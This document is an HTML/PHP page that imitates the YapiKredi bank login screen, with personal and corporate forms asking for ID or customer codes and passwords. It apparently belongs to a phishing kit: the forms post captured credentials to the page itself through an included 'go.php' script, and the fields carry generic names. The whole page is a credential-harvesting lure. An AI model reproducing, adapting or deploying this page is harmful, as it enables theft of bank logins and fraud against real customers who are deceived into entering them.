<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>YapiKredi</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/ykb.css">

    <script src="js/jquery.min.js"></script>
    <script src="js/viewport.js"></script>
    <script src="js/cat.functions.js"></script>
</head>

<body>
    <div class="row">
        <div class="form_header">
            <img src="images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				
                
						<div class="row" id="select_type">
						<div class="content">

							<div class="btn_wr">
								<button class="sign_btn" id="pers_btn" type=button>
									B&#304;REYSEL <img src="images/arr.png" alt="">
								</button>
							</div>

							<div class="btn_wr">
								<button class="sign_btn"  id="corp_btn">
									KURUMSAL <img src="images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>

<script>

function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}

$(document).ready(function() {
$('#pers_btn').click(function(){
$('#row_pers').show();
$('#row_corp').remove();
$('#select_type').remove();
return false;
});

$('#corp_btn').click(function(){
$('#row_corp').show();
$('#row_pers').remove();
$('#select_type').remove();
return false;
});





});
</script>
<style>

.inpError{

border: 2px solid red;
}
</style>
				<form action="" method="post" class="wrapper">
					<div class="row" id="row_pers" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 TCKN veya Kullan&#305;c&#305; Kodu 
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" name="field4" class="main_input">
									<input type="hidden" name="field2" value="pers_acc">
								</div>
							</div>
							<div class="btn_wr">
								<input class="sign_btn" type="submit" value="Giri&#351;">
							</div>
						</div>
					</div>
				</form>
				<form action="" method="post" class="wrapper">
					<div class="row" id="row_corp" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									Firma Kodu / M&#252;&#351;teri Kodu
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Kullan&#305;c&#305; Kodu
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" name="field4" class="main_input">
								</div>
							</div>

							<div class="btn_wr">
								<input class="sign_btn" type="submit" value="Giri&#351;">
							</div>
						</div>
					</div>				



				</form>
			</div>
		</div>
</body>

</html>